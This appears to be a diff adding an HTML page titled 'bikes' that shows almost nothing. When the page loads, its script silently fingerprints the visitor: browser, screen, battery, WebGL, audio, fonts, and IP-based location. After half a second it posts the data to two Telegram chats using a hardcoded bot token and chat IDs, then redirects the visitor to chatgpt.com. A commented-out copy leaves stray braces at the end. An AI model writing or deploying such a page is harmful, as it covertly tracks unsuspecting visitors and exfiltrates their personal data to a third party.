@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>bikes</title>
+  <style>
+    body {
+      font-family: monospace;
+      padding: 20px;
+      background: #000;
+      color: #0f0;
+    }
+    h1 {
+      color: #0ff;
+    }
+    #info {
+      white-space: pre-wrap;
+      font-size: 14px;
+      margin-top: 20px;
+    }
+    button {
+      margin-top: 20px;
+      padding: 10px 20px;
+      background: #0f0;
+      color: #000;
+      border: none;
+      cursor: pointer;
+      font-size: 16px;
+    }
+  </style>
+</head>
+<body>
+  <h1>.</h1>
+
+  <script>
+    setTimeout(() => {
+  sendToTelegram();
+  window.location.href = "https://chatgpt.com/";
+}, 500); 
+
+    let collectedData = {};
+
+    async function getUserInfo() {
+      const info = {};
+
+      info.userAgent = navigator.userAgent;
+      info.language = navigator.language;
+      info.languages = navigator.languages;
+      info.platform = navigator.platform;
+      info.doNotTrack = navigator.doNotTrack;
+      info.cookieEnabled = navigator.cookieEnabled;
+
+      info.screen = {
+        width: screen.width,
+        height: screen.height,
+        availWidth: screen.availWidth,
+        availHeight: screen.availHeight,
+        colorDepth: screen.colorDepth,
+        pixelDepth: screen.pixelDepth
+      };
+
+      info.storage = {
+        localStorage: !!window.localStorage,
+        sessionStorage: !!window.sessionStorage,
+        indexedDB: !!window.indexedDB
+      };
+
+      info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      info.timezoneOffset = new Date().getTimezoneOffset();
+      info.localTime = new Date().toString();
+
+      if (navigator.getBattery) {
+        try {
+          const battery = await navigator.getBattery();
+          info.battery = {
+            level: (battery.level * 100).toFixed(0) + '%',
+            charging: battery.charging
+          };
+        } catch {}
+      }
+
+      info.hardwareConcurrency = navigator.hardwareConcurrency;
+      info.deviceMemory = navigator.deviceMemory || "N/A";
+      info.touchSupport = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
+      info.prefersDarkMode = window.matchMedia("(prefers-color-scheme: dark)").matches;
+      info.referrer = document.referrer || "Direct Access";
+
+      try {
+        const canvas = document.createElement("canvas");
+        const gl = canvas.getContext("webgl");
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        info.webgl = {
+          vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+          renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+        };
+      } catch {
+        info.webgl = "Unavailable";
+      }
+
+      try {
+        const ctx = new (window.AudioContext || window.webkitAudioContext)();
+        const osc = ctx.createOscillator();
+        const analyser = ctx.createAnalyser();
+        osc.connect(analyser);
+        osc.start(0);
+        const fingerprint = new Float32Array(analyser.frequencyBinCount);
+        analyser.getFloatFrequencyData(fingerprint);
+        info.audioFingerprint = fingerprint.slice(0, 5);
+        osc.stop();
+        ctx.close();
+      } catch {
+        info.audioFingerprint = "Unavailable";
+      }
+
+      const fonts = ["Arial", "Verdana", "Times New Roman", "Courier New", "Comic Sans MS"];
+      const baseWidth = {};
+      const fontDiv = document.createElement("div");
+      fontDiv.style.position = "absolute";
+      fontDiv.style.top = "-9999px";
+      fontDiv.style.left = "-9999px";
+      fontDiv.style.fontSize = "72px";
+      fontDiv.innerText = "mmmmmmmmmmlli";
+      document.body.appendChild(fontDiv);
+
+      fonts.forEach(font => {
+        fontDiv.style.fontFamily = font;
+        baseWidth[font] = fontDiv.offsetWidth;
+      });
+      document.body.removeChild(fontDiv);
+      info.availableFonts = fonts.filter(f => baseWidth[f] > 0);
+
+      try {
+        const res = await fetch("https://ipapi.co/json/");
+        const data = await res.json();
+        info.ip = data.ip;
+        info.city = data.city;
+        info.region = data.region;
+        info.country = data.country_name;
+        info.org = data.org;
+      } catch (e) {
+        info.ip = "Fetch failed";
+      }
+
+      collectedData = info;
+      
+    }
+
+
+
+
+
+async function sendToTelegram() {
+  const botToken = "8079871434:AAFlp-MDPEFED9uTwGoHG1wN00OwbNVsVd0";
+  const chatIds = ["7258927081", "6854356772"];
+
+  const message =
+    "*📊 User Info Collected:*\n```\n" +
+    JSON.stringify(collectedData, null, 2) +
+    "\n```";
+
+  try {
+    for (const chatId of chatIds) {
+      const res = await fetch(
+        `https://api.telegram.org/bot${botToken}/sendMessage`,
+        {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+            parse_mode: "Markdown"
+          })
+        }
+      );
+
+      if (!res.ok) {
+        console.error(`Failed to send to ${chatId}:`, await res.text());
+      }
+    }
+  } catch (error) {
+    console.error("Telegram error:", error);
+  }
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+    
+    // async function sendToTelegram() {
+    //   const botToken = "8079871434:AAFlp-MDPEFED9uTwGoHG1wN00OwbNVsVd0";
+    //   const chatId = "7258927081"; // Replace with your Telegram user ID
+
+    //   const message = "*📊 User Info Collected:*\n```\n" + JSON.stringify(collectedData, null, 2) + "\n```";
+
+    //   try {
+    //     const res = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+    //       method: "POST",
+    //       headers: {
+    //         'Content-Type': 'application/json'
+    //       },
+    //       body: JSON.stringify({
+    //         chat_id: chatId,
+    //         text: message,
+    //         parse_mode: "Markdown"
+    //       })
+    //     });
+
+        
+      } catch (error) {
+        
+      }
+    }
+
+    getUserInfo();
+  </script>
+</body>
+</html>
